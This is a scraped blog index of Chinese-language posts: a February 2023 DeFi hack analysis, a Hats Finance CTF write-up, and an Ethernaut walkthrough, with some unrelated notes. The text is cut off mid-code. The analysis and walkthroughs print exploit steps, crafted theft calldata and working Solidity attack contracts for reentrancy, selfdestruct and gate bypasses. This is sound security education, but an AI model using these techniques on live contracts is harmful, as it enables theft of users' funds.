https://forum.aptoslabs.com/t/aptos-review-account-system/150437 https://aptos.dev/tutorials/your-first-multisig/ ","date":"2023-07-08T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/aptos-key-rotation/","title":"Aptos Key Rotation"},{"content":"Overview 2023 年 2 月，攻擊者竊取了約 3550 萬美元的加密貨幣。\nHopeless\u0026hellip;\nDefi 安全事件 2 月 3 日，bonqdao 遭受價格操控攻擊，損失約 1.2 億美元，但攻擊者只拿走不到 200 萬美元。 2 月 3 日，USDs 遭受攻擊，損失約 30 萬美元。 2 月 4 日，orion protocol 遭受閃電貸重入攻擊，損失約 300 萬美元。 2 月 10 日，dForce 遭受攻擊，又是 read-only reentrancy，損失約 370 萬美元。 2 月 17 日，Avalanche 鏈上的 Platypus 項目遭受閃電貸攻擊，損失約 850 萬美元。 2 月 17 日，Dexible 項目因合約中函數邏輯漏洞遭受攻擊，損失約 154 萬美元。 2 月 24 日，Shata Capital 合約在升級後遭受攻擊，損失約 510 萬美元。 2 月 27 日，SwapX 合約因關鍵函數缺乏訪問控制而遭到攻擊，此合約並未開源，多個授權給該合約的代幣遭受了損失，涉及金額約 90 萬美元。 其他安全事件 2 月 21 日，Arbitrum 鏈上 Hope Finance 發生 rug pull，提取了 180 萬美元並轉入 Tornado Cash。 2 月 25 日，Wormhole 遭駭的 12 萬顆 eth 被 Jump Crypto 及 Oasis 回收。 Platypus 攻擊者存入 4400 萬抵押品，借入 4200 萬，然後使用 emergencyWithdraw()，它很高興地向攻擊者返還了全部存入的抵押品——此時攻擊者擁有的是 4400 萬抵押品加上借入的 4200 萬。\n攻擊交易： https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430 攻擊者地址： https://snowtrace.io/address/0xeff003d64046a6f521ba31f39405cb720e953958 漏洞關鍵點：emergencyWithdraw() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /// @notice Withdraw without caring about rewards. EMERGENCY ONLY. /// @param _pid the pool id function emergencyWithdraw(uint256 _pid) public nonReentrant { PoolInfo storage pool = poolInfo[_pid]; UserInfo storage user = userInfo[_pid][msg.sender]; if (address(platypusTreasure) != address(0x00)) { (bool isSolvent, ) = platypusTreasure.isSolvent(msg.sender, address(poolInfo[_pid].lpToken), true); require(isSolvent, \u0026#39;remaining amount exceeds collateral factor\u0026#39;); } // reset rewarder before we update lpSupply and sumOfFactors IBoostedMultiRewarder rewarder = pool.rewarder; if (address(rewarder) != address(0)) { rewarder.onPtpReward(msg.sender, user.amount, 0, user.factor, 0); } // SafeERC20 is not needed as Asset will revert if transfer fails pool.lpToken.transfer(address(msg.sender), user.amount); // update non-dialuting factor pool.sumOfFactors -= user.factor; user.amount = 0; user.factor = 0; user.rewardDebt = 0; emit EmergencyWithdraw(msg.sender, _pid, user.amount); } isSolvent() 主要檢查的是抵押品的價值是否大於借款的價值。 emergencyWithdraw() 並沒有除了 isSolvent() 的其他檢查。\n利用步驟 攻擊者閃電貸貸出 44M USDC。 將 USDC 存入 Platypus 的池子中並拿到 LP token。 將 LP token 透過 MasterPlatypusV4 進行 deposit()。 透過 PlatypusTreasure 進行借款 borrow()，借出 USP。 調用 emergencyWithdraw() 領出所有抵押品。因為借貸的額度沒有超過最高限制， isSolvent 函數返回為 true，攻擊者便可以提取抵押品。 將 USP 換成其他穩定幣。 償還閃電貸獲利。 後續 資金依然留存在攻擊合約中，因為攻擊者沒寫 withdraw() https://snowtrace.io/tokenholdings?a=0x67afdd6489d40a01dae65f709367e1b1d18a5322 Tether 將攻擊者地址列入黑名單 Tether blacklisted them pic.twitter.com/GCto0N68AY\n\u0026mdash; ZachXBT (@zachxbt) February 16, 2023 ZachXBT 追溯到攻擊者的推特帳戶 Hi @retlqw since you deactivated your account after I messaged you.\nI\u0026#39;ve traced addresses back to your account from the @Platypusdefi exploit and I am in touch with their team and exchanges.\nWe’d like to negotiate returning of the funds before we engage with law enforcement. pic.twitter.com/oJdAc9IIkD\n\u0026mdash; ZachXBT (@zachxbt) February 17, 2023 2/18 Blocksec 取回被盜資金 We help @Platypusdefi recover 2.4M USDC from the attacker contract successfully!\nBlockSec will always be here to secure the whole ecosystem. https://t.co/13JkXxy2II\n\u0026mdash; BlockSec (@BlockSecTeam) February 17, 2023 2/26 法国警方已逮捕涉嫌攻击 Platypus Finance 的两名黑客 https://foresightnews.pro/news/detail/18357 Blocksec Reverse Hack 交易： https://snowtrace.io/tx/0x5e3eb070c772631d599367521b886793e13cf0bc150bd588357c589395d2d5c3 In a dazzling reverse hack, a substantial chunk of the Playtpus hack stolen funds have been recovered.\nHere\u0026#39;s how it worked: (1/4) pic.twitter.com/gRWkLPMr7Q\n\u0026mdash; Daniel Von Fange (@danielvf) February 17, 2023 Blocksec 直接復用攻擊合約的 executeOperation()，達成一次精彩的資金救援。\n攻擊合約的 executeOperation() 並未檢查是否為 AAVE flashloan 的 callback，導致任何人都可以調用此函數。\n項目方升級合約，升級成攻擊期間竊取攻擊者的資金給項目方。順序涉及 approve USDC 給 Platypus 項目方合約，deposit USDC 到 Platypus pool 中，但攻擊合約不會拿到 LP token。 Reference https://twitter.com/danielvf/status/1626340324103663617 https://twitter.com/danielvf/status/1626641254531448833 Dexible selfSwap 函數存在調用 fill 函數的邏輯缺陷，調用攻擊者的自定義數據，並無檢查此自定義數據。攻擊者在數據中構造 transferfrom 函數，傳入其他用戶和自己的攻擊地址，允許合約認可的代幣轉出。\n攻擊交易： https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6 攻擊者地址： https://etherscan.io/address/0x684083f312ac50f538cc4b634d85a2feafaab77a 漏洞關鍵點：selfSwap() \u0026amp; fill() selfSwap() 允許用戶自己定義交易路徑，並且可以指定交易的代幣、DEX，也就是說要指定調用什麼 DEX 以及向什麼 DEX 發送什麼 data 來進行交易。 並沒有檢查地址是不是真的是一個 DEX，也沒有一個白名單。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function selfSwap(SwapTypes.SelfSwap calldata request) external notPaused { //we create a swap request that has no affiliate attached and thus no //automatic discount. SwapTypes.SwapRequest memory swapReq = SwapTypes.SwapRequest({ executionRequest: ExecutionTypes.ExecutionRequest({ fee: ExecutionTypes.FeeDetails({ feeToken: request.feeToken, affiliate: address(0), affiliatePortion: 0 }), requester: msg.sender }), tokenIn: request.tokenIn, tokenOut: request.tokenOut, routes: request.routes }); SwapMeta memory details = SwapMeta({ feeIsInput: false, isSelfSwap: true, startGas: 0, preSwapVault: address(DexibleStorage.load().communityVault), bpsAmount: 0, gasAmount: 0, nativeGasAmount: 0, toProtocol: 0, toRevshare: 0, outToTrader: 0, preDXBLBalance: 0, outAmount: 0, inputAmountDue: 0 }); details = this.fill(swapReq, details); postFill(swapReq, details, true); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function fill(SwapTypes.SwapRequest calldata request, SwapMeta memory meta) external onlySelf returns (SwapMeta memory) { preCheck(request, meta); meta.outAmount = request.tokenOut.token.balanceOf(address(this)); for(uint i=0;i\u0026lt;request.routes.length;++i) { SwapTypes.RouterRequest calldata rr = request.routes[i]; IERC20(rr.routeAmount.token).safeApprove(rr.spender, rr.routeAmount.amount); (bool s, ) = rr.router.call(rr.routerData); if(!s) { revert(\u0026#34;Failed to swap\u0026#34;); } } ... return meta; } rr.routerData 可自行構造，攻擊者在此構造了一個 transferFrom 函數，傳入其他用戶和自己的攻擊地址，允許合約認可的代幣轉出。\n1 2 3 { routerData:\u0026#34;0x23b872dd00000000000000000000000058f5f0684c381fcfc203d77b2bba468ebb29b098000000000000000000000000684083f312ac50f538cc4b634d85a2feafaab77a00000000000000000000000000000000000000000000000000066189a9f3b980\u0026#34; } 0x23b872dd 即為 transferFrom(address,address,uint256) 的 function selector。\n利用步驟 先找一個有 approve token 給 Dexible 合約的受害者。 調用 selfSwap()，並構造指定 calldata。將受害者的代幣轉移到攻擊者的地址。 後續 攻擊者將資金轉移到 Tornado Cash 項目方已暫停所有合約功能 Reference https://rekt.news/zh/dexible-rekt/ Shata Capital EFVault 合約升級後關鍵變數未正確配置，導致可以領出比實際存入的代幣更多的代幣。\n攻擊交易： https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914 攻擊者地址： https://etherscan.io/address/0xa0959536560776ef8627da14c6e8c91e2c743a0a 漏洞關鍵點：EFVault 合約升級，storage collision 在新版本中新增了幾個變數，未考慮舊版本 impl 的 storage。讀取 assetDecimal 時其實是讀到舊版本的 maxDeposit，他們在同一個 storage slot。\n新版本 EFVault 的 impl 中的 initialize() 不能被調用，因為 proxy 已經初始化過不能再次初始化，使得新增的變數不能進行初始化。\n🤦‍♂️ pic.twitter.com/5j3X95dzTe\n\u0026mdash; 3155.eth (@punk3155) March 1, 2023 setMaxDeposit 是用來設定 maxDeposit，新的值被設為了 5000000000000，表示 assetDecimal=5000000000000，遠大於預期的值。\n升級的合約新增了 redeem() 函數。讀取到的 storage 導致用戶可以獲得比他們實際應該獲得的更多資金。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function redeem(uint256 shares, address receiver) public virtual nonReentrant unPaused onlyAllowed returns (uint256 assets) { require(shares \u0026gt; 0, \u0026#34;ZERO_SHARES\u0026#34;); require(shares \u0026lt;= balanceOf(msg.sender), \u0026#34;EXCEED_TOTAL_BALANCE\u0026#34;); assets = (shares * assetsPerShare()) / 1e24; // HERE!!! require(assets \u0026lt;= maxWithdraw, \u0026#34;EXCEED_ONE_TIME_MAX_WITHDRAW\u0026#34;); // Withdraw asset _withdraw(assets, shares, receiver); } 1 2 3 function assetsPerShare() internal view returns (uint256) { return (IController(controller).totalAssets(false) * assetDecimal * 1e18) / totalSupply(); } 利用步驟 攻擊者在事件發生前 27 天有調用 deposit()向 EFVault 存入 0.1 ETH，獲得一定數量的 shares。 項目方升級合約。 升級後沒過幾個 block，攻擊者調用 redeem() 獲利。 後續 攻擊者將資金轉移到 Tornado Cash Shata Capital 表示他們掌握了有關攻擊者身份的線索，並給他們 24 小時的時間來返還資金。（懷疑是自己人，畢竟怎麼可能升級之後馬上知道要展開攻擊） 2/ Shata Capital stated they have clues about the exploiter’s identity and gave them 24 hours to return the funds for a white hat bounty. The 24 hours have now passed. pic.twitter.com/JGDEmhZWrv\n\u0026mdash; CertiK Alert (@CertiKAlert) February 28, 2023 Refernece https://twitter.com/BeosinAlert/status/1630884733671579653 https://twitter.com/peckshield/status/1630490333716029440 Jump Crypto \u0026amp; Oasis Counter Exploit 前情提要 2022 年 2 月，跨鏈橋 Wormhole 遭到攻擊，損失了 12 萬個 ETH，當時總價值約 3.25 億美元。\n2023 年 1 月份，攻擊者在 MakerDao 旗下的 Oasis 上存入了 2.18 億美元的抵押品，並開設了兩個 vault，循環抵押 wstETH、rETH 借貸 DAI 做多 ETH。\n2023 年 2 月 16 日白帽聯繫了 Oasis 團隊，向其披露了一個漏洞，能夠將任何 vault 中的資產與債務轉移。\n2023 年 2 月 21 日，在英格蘭及威爾斯高等法院的命令下，Oasis 團隊利用可升級的 Oasis 合約，從 Wormhole Exploiter 的 vault 中轉移了抵押品與債務。\nVault 30100 Oasis 提供 Automation Services（AutomationBot 合約），能夠創建 stop-loss trigger 自動幫用戶的 vault 賣抵押品還貸款等。\n只要在 vault 中加入 automation trigger，AutomationBot 合約就能獲得對 vault 的訪問權限。然而，Oasis 合約可升級。\n歷史數據： https://oasis.app/30100#history 利用步驟 攻擊交易： https://etherscan.io/tx/0x4f4117317a9f69915cbd060dc649c91bdc2963ea326ede46b14a2d8ef9007617 設定 upgrade delay 到 0 部署 Authorizer 及 Executor 合約 通過 ServiceRegistry 替換合約，McdView -\u0026gt; Authorizer，McdView 用來控制 vault 的 ratio，使 vault 可以觸發 stop-loss。MultiProxyActions -\u0026gt; Executor，替換了 CloseCommand delegatecall 的一個合約（stop-loss的邏輯合約），不執行 stop-loss 操作而是創建一個新的 vault，將攻擊者的 vault 資產及債務轉移到新的 vault（CDP_MANAGER shift操作）。 轉移 vault 的所有權到 Oasis Multisig 關閉 vault 建立一個新的 vault 並轉移抵押品與債務 將 proxy contract 回復到原地址 Oasis 違背了去中心化的精神\u0026hellip; 未來會不會有更多類似的事情發生？\nReference https://www.blockworksresearch.com/research/we-do-a-little-counter-exploit ","date":"2023-03-08T00:00:00Z","image":"https://i.imgur.com/JbOqEij.jpg","permalink":"https://ashirleyshe.github.io/p/2023-feb-defi-hack-recap-analysis/","title":"2023 Feb Defi Hack Recap \u0026 Analysis"},{"content":"Intro 前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。\nVault Game Repo\nVault.sol 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。\nThe Challenge 最初會deposit 1 ether 到 vault 中。\n1 2 3 4 constructor() payable ERC20(“Vault Challenge Token”, “VCT”) { require(msg.value == 1 ether, “Must init the contract with 1 eth”); _deposit(msg.sender, address(this), msg.value); } 通關目標為清空 valut 的 balance:\n1 2 3 4 function captureTheFlag(address newFlagHolder) external { require(address(this).balance == 0, “Balance is not 0”); flagHolder = newFlagHolder; } Observation 先觀察一一下能轉出 ether 的地方，ERC4626ETH.sol 的 _withdraw()(line 148):\n1 2 3 4 5 6 uint256 excessETH = totalAssets() - totalSupply(); _burn(_owner, amount); Address.sendValue(receiver, amount); if (excessETH \u0026gt; 0) { Address.sendValue(payable(owner()), excessETH); } withdraw() 跟 redeem()都會進_withdraw()，而且沒有 reentrancy guard。\n注意到_withdraw()中，有兩個 sendValue，第一個傳送 amount ether 給 receiver，第二個會傳送 excessETH 給 owner。而 excessETH 的值一開始就被暫存，因此在第一次的 ether transfer 重入 withdraw()，設定 amount = 0，這樣便不會影響到 excessETH，藉此可以得到額外的 excessETH，最終清空 vault。\n要讓 excessETH \u0026gt; 0，需增加totalAssets()但不能動到totalSupply()，可以透過 selfdestruct 強制轉移 ether 到 vault 合約中。\nExploit 建立一個合約轉入 1 ether 並調用 selfdestruct，所以此時 vault 的 excessETH = 1 ether。 調用 withdraw()，將 amount 設為 0。 重入 withdraw()，excessETH = 1 ether 被轉給 owner，此時 vault balance = 1 ether。 回到被劫持的 withdraw()，excessETH = 1 ether 再次被轉給 owner，vault balance = 0。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 pragma solidity ^0.8.0; import \u0026#34;forge-std/Test.sol\u0026#34;; import \u0026#34;../src/Vault.sol\u0026#34;; contract Destruct { constructor() payable {} function destruct(address payable target) external payable { selfdestruct(target); } } contract VaultTest is Test { Vault vault; bool flag = true; function setUp() public {} function testExp() public { vm.deal(address(this), 2 ether); Destruct destruct = new Destruct{value: 1 ether}(); vault = new Vault{value: 1 ether}(); // send unexpected ether to vault destruct.destruct(payable(address(vault))); vault.withdraw(0 ether, address(this), address(this)); console.log(\u0026#34;vault balance\u0026#34;, address(vault).balance); vault.captureTheFlag(address(this)); console.log(\u0026#34;vault.flagHolder\u0026#34;, vault.flagHolder()); } receive() external payable { if (flag) { flag = !flag; vault.withdraw(0, address(this), address(this)); } } } ","date":"2022-10-12T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/hats-finance-ctf-2-writeup/","title":"Hats Finance CTF 2 WriteUp"},{"content":"配置 GitHub 金鑰 流程：\n產生 key pair 在 GitHub 放 public key 產生 key pair 1 2 cd ~/.ssh ssh-keygen -t ed25519 -C \u0026#34;your_email@example.com\u0026#34; 不設密碼的話直接按 enter\n1 2 3 Enter file in which to save the key (/home/username/.ssh/id_ed25519): /home/username/.ssh/github_key Enter passphrase (empty for no passphrase): Enter same passphrase again: 在 GitHub 放 public key 複製公鑰放到 GitHub\n1 cat id_ed25519.pub 貼到這邊： Settings -\u0026gt; SSH and GPG keys → New SSH key\n連線測試 1 ssh -T git@github.com ~/.ssh/config 1 2 3 4 Host github.com HostName github.com User ashirleyshe IdentityFile ~/.ssh/id_rsa 多個帳號 查看 config 1 git config --list 改 config 1 2 git config user.name XXX git config user.email XXX add remote 1 git remote add origin git@niugiao:niujiao-yum/niugiao-contracr.git ","date":"2022-10-03T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/github-notes/","title":"Github Notes"},{"content":"Transaction Decoder EthTx Transaction Decoder Ethereum Transaction Viewer Phalcon Tenderly blockchair Solidity Decompiler ethervm dedaub Others deth tools EthToolbox Ethereum Signature Database evm codes unix timestamp ","date":"2022-09-30T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/blockchain-tools/","title":"Blockchain Tools"},{"content":"Settings 三指拖曳 App Homebrew iTerm2 oh my zsh Spectable vs code Tips oh my zsh git alias Env zsh: command not found: code 在 vs code 中 F1 -\u0026gt; \u0026gt;shell command: install 'code' command in PATH\n","date":"2022-09-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/my-mac-settings/","title":"My Mac Settings"},{"content":"Ethernaut 是學習區塊鏈及 solidity 非常好的入門學習材料，之前是在 Rinkeby 測試網上，但測試網會陸續關掉，之後可以在 local 部署。\n還是紀錄一下解題🐱\n事前準備 Metamask Remix 測試幣：https://faucet.paradigm.xyz/ Web3.js 基礎 0. Hello Ethernaut 打開 console(F12)，目標讓 clear = true。 觀察 authenticate() 需傳入 passkey，\n1 2 3 4 5 function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } password 是個 public 變數。\n1 string public password; 1 2 await contract.password() // output: \u0026#39;ethernaut0\u0026#39; 拿到 password 傳入 authenticate()\n1 await contract.authenticate(\u0026#39;ethernaut0\u0026#39;) Level completed.\n1. Fallback 讓 owner = player 且 contract balance = 0\n觀察 receive() 可以做到，但需繞過條件 msg.value \u0026gt; 0 且 contributions[msg.sender] \u0026gt; 0。\n1 2 3 4 receive() external payable { require(msg.value \u0026gt; 0 \u0026amp;\u0026amp; contributions[msg.sender] \u0026gt; 0); owner = msg.sender; } contributions[msg.sender] \u0026gt; 0 透過 contribute() 達成此條件 1 2 3 4 5 6 7 function contribute() public payable { require(msg.value \u0026lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u0026gt; contributions[owner]) { owner = msg.sender; } } 送 ether 給合約進入 receive() 此時 owner = player，onlyOwner 可過，調用 withdraw() 可以領全部的錢 1 2 3 function withdraw() public onlyOwner { owner.transfer(address(this).balance); } Exploit 1 2 3 await contract.contribute({value: toWei(\u0026#34;0.00001\u0026#34;)}); await contract.send({value: toWei(\u0026#34;0.00001\u0026#34;)}); await contract.withdraw(); 確定 balance = 0\n1 2 await getBalance(contract.address); // output: 0 Level completed.\n2. Fallout 目標 owner = player\n舊版本 Solidity 合約同名的函數作為 constructor\n1 2 3 4 5 /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } Exploit 直接呼叫 Fal1out() 就完事了\n1 await contract.Fal1out(); Level completed.\n3. Coin Flip 猜硬幣正反面遊戲，需連續猜對 10 次（不同 block）i.e. consecutiveWins = 10\n用 block.number 作為隨機數\n1 uint256 blockValue = uint256(blockhash(block.number.sub(1))); 每次猜測需在不同 block\n1 2 3 if (lastHash == blockValue) { revert(); } Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#39;./SafeMath.sol\u0026#39;; interface ICoinFlip { function flip(bool _guess) external returns (bool); } contract CoinFlip { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function guess(address levelInstance) public { uint256 blockValue = uint256(blockhash(block.number.sub(1))); uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == true) { ICoinFlip(levelInstance).flip(true); } else { ICoinFlip(levelInstance).flip(false); } } } Check consecutiveWins\n1 2 await contract.consecutiveWins().then(v =\u0026gt; v.toString()) // Output: \u0026#39;10\u0026#39; Level completed.\n4. Telephone 目標 owner = player\n了解 tx.origin 與 msg.sender 的差別：\n1 2 3 4 5 function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } 舉例：A-\u0026gt;B-\u0026gt;C-\u0026gt;D Inside D: msg.sender 為 C (sender of the message) tx.origin 為 A (sender of the transaction) Exploit 部署一個合約呼叫 changeOwner() 即可通過 tx.origin != msg.sender\n1 2 3 4 5 6 7 8 9 10 11 12 13 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface ITelephone { function changeOwner(address _owner) external; } contract TelephoneAttack { function attack(address _addr) public { ITelephone(_addr).changeOwner(msg.sender); } } Level completed.\n5. Token 目標 balances[player] \u0026gt; 20，初始 balances[player] = 20\n觀察 solidity 版本 0.6.0 且沒有 SafeMath（0.8.0 後自帶 SafeMath）\n1 2 3 4 5 6 function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value \u0026gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } unit256 範圍為 0 到 2^256 - 1，所以 Line 2: require 一定會過\n任何加法減法都可能會 overflow/underflow\n1 20 - 21 = 2^256 - 1 所以轉出 21 到別的地址即可\nExploit 1 await contract.transfer(instance, 21) Level completed.\n6. Delegation 目標 owner = player\n注意到 Delegate 合約有個 pwn() 可以改 owner:\n1 2 3 function pwn() public { owner = msg.sender; } Delegation 合約的 fallback() 可以有個 delegatecall（執行另一個合約的邏輯，狀態是改變現在這個合約）\n1 2 3 4 5 6 fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } Exploit 利用 fallback() 中的 delegatecall 調用 pwn()\n1 2 signature = web3.eth.abi.encodeFunctionSignature(\u0026#34;pwn()\u0026#34;) await contract.sendTransaction({ from: player, data: signature }) Level completed.\n7. Force 目標讓合約 balance \u0026gt; 0\n可以看到沒 receive 或 fallback\n1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} 送 unexpected ether 最簡單的做法：合約 selfdestruct 並發送 ether 到指定地址\nExploit 記得先轉 ether 進去再 selfdestruct\n1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForceAttack { constructor() public payable {} receive() external payable {} function attack(address payable target) public { selfdestruct(target); } } Level completed.\n8. Vault 目標 locked = false\npassword 雖然是 private 但還是能透過知道他在哪個 slot 拿到他的值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } slot 0: bool public locked; slot 1: bytes32 private password; Exploit 1 2 password = await web3.eth.getStorageAt(contract.address, 1) await contract.unlock(password) Level completed.\n9. King 目標 king = player\n必須付比 prize() 更多的 ether 成為新的 king，提交 instance 時要避免 level 再度成為 king\n1 2 3 4 5 6 receive() external payable { require(msg.value \u0026gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } line 4 會改變 king，因此需想辦法在 line 3 卡住\nExploit 不寫 receive 或 fallback，當進到 king.transfer(msg.value) 會有 exception\n1 2 3 4 5 6 7 8 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForeverKing { function claimKingship(address payable _to) public payable { (bool sent, ) = _to.call.value(msg.value)(\u0026#34;\u0026#34;); } } Level completed.\n10. Re-entrancy 目標偷走合約所有的資產\n很明顯違反 check-effect-interactions pattern\n1 2 3 4 5 6 7 8 9 function withdraw(uint _amount) public { if(balances[msg.sender] \u0026gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(\u0026#34;\u0026#34;); if(result) { _amount; } balances[msg.sender] -= _amount; } } Exploit donate() withdraw() 重入 withdraw()，此時 balances[msg.sender] 還沒被改變 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IReentrance { function donate(address _to) external payable; function withdraw(uint _amount) external; } contract ReentranceAttack { IReentrance target; uint targetValue = 1000000000000000; constructor(address _targetAddr) public { target = IReentrance(_targetAddr); } function donateAndWithdraw() public payable { require(msg.value \u0026gt;= targetValue); target.donate.value(msg.value)(address(this)); target.withdraw(msg.value); } receive() external payable { uint targetBalance = address(target).balance; if (targetBalance \u0026gt;= targetValue) { target.withdraw(targetValue); } } } Level completed.\n11. Elevator 目標 top = true\n需要自己實作 isLastFloor()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } 第一次呼叫 isLastFloor() 需回傳 false(line 15)，第二次需回傳 true(line 17)\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IElevator { function goTo(uint _floor) external; } contract ElevatorAttack { bool public isLast = true; function isLastFloor(uint) public returns (bool) { isLast = ! isLast; return isLast; } function attack(address _victim) public { IElevator(_victim).goTo(1); } } Level completed.\n12. Privacy 目標 locked = false\n得知道 bytes16(data[2]) 是什麼\n1 2 3 4 function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } 看一下 storage 的狀況：\n1 2 3 4 5 6 slot 0: bool slot 1: ID slot 2: awkwardness | denomination | flattening slot 3: data[0] slot 4: data[1] slot 5: data[2] Exploit 1 2 3 4 5 6 key = await web3.eth.getStorageAt(contract.address, 5) // Output: \u0026#39;0x5dd89f7b81030395311dd63330c747fe293140d92dbe7eee1df2a8c233ef8d6d\u0026#39; // 取 bytes16，記得加上 0x，所以是 34 key = key.slice(0, 34) // Output: 0x5dd89f7b81030395311dd63330c747fe await contract.unlock(key) Level completed.\n13. Gatekeeper One 目標 entrant = player\ngateOne 同 4.\n1 2 3 4 modifier gateOne() { require(msg.sender != tx.origin); _; } gateTwo gasleft 得被 8191 整除\n1 2 3 4 modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } 可以本地跑看看估算大概多少 gas，搞個 for 在某個區間試試看\n1 2 3 4 5 6 7 8 9 10 11 12 contract GateKeeperOneGasEstimate { function enterGate(address _gateAddr, uint256 _gas) public returns (bool) { bytes8 gateKey = bytes8(uint64(tx.origin)); for (unit i = _gas; i \u0026lt; _gas + 8191; i++){ (bool success, ) = address(_gateAddr).call.gas(_gas)(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, gateKey)); if (success) { break; } } return success; } } gateThree 1 2 3 4 5 6 modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); _; } 舉例 player = 0xac32124edDcE61fFa17167a9c449aDc38fc8AEF4\n先看 line 4: uint32(uint64(_gateKey)) == uint16(tx.origin)\n1 2 3 4 uint32(uint64(key)) = 8f c8 AE F4 uint16(tx.origin) = AE F4 8f c8 AE F4 \u0026amp; 00 00 FF FF = 00 00 AE F4 line 3: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)\n1 2 8f c8 AE F4 == AE F4 8f c8 AE F4 \u0026amp; 00 00 FF FF = 00 00 AE F4 line 2: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)\n1 2 8f c8 AE F4 != c4 49 aD c3 8f c8 AE F4 c4 49 aD c3 8f c8 AE F4 \u0026amp; FF FF FF FF 00 00 FF FF = c4 49 aD c3 00 00 AE F4 Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract Gate { function enterGate(address _gateAddr, uint256 _gas) public returns (bool) { bytes8 key = bytes8(uint64(tx.origin)) \u0026amp; 0xffffffff0000ffff; bool succeeded = false; for (uint i = _gas; i \u0026lt; _gas + 8191; i++) { (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, key)); if (success) { succeeded = success; break; } } return succeeded; } } 14. Gatekeeper Two 目標 entrant = player\ngateOne 同 4.\ngateTwo extcodesize(a)： 取得位於地址 a 的程式碼大小\n小知識：在 constructor 去調用時， extcodesize(a) 會回傳 0，因為尚未完成部署 gateThree 1 2 3 4 modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } If (X ^ Y = Z) =\u0026gt; (Y = X ^ Z)\n1 _gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1) Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface GatekeeperTwoInterface { function enter(bytes8 _gateKey) external returns (bool); } contract GatekeeperTwoAttack { GatekeeperTwoInterface gatekeeper; constructor(address GatekeeperTwoContractAddress) public { gatekeeper = 